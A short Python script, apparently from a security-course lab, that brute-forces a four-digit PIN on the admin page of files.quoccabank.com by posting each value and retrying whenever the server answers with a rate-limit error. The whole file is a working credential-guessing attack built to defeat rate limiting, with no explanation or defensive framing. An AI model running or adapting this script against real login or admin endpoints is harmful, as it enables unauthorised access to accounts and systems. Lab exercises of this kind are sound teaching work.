import requests

for i in range(2000):

    body = {"pin":str(i).zfill(4)}

    headers = {'Content-length': '8'}

    x = requests.post('https://files.quoccabank.com/admin', headers=headers, data=body)

    if x.status_code == 429:
        while True:
            x = requests.post('https://files.quoccabank.com/admin', headers=headers, data=body)
            if x.status_code != 429:
                break
   
    print(x.text)
    print(x.request.headers)
    print(x.request.body)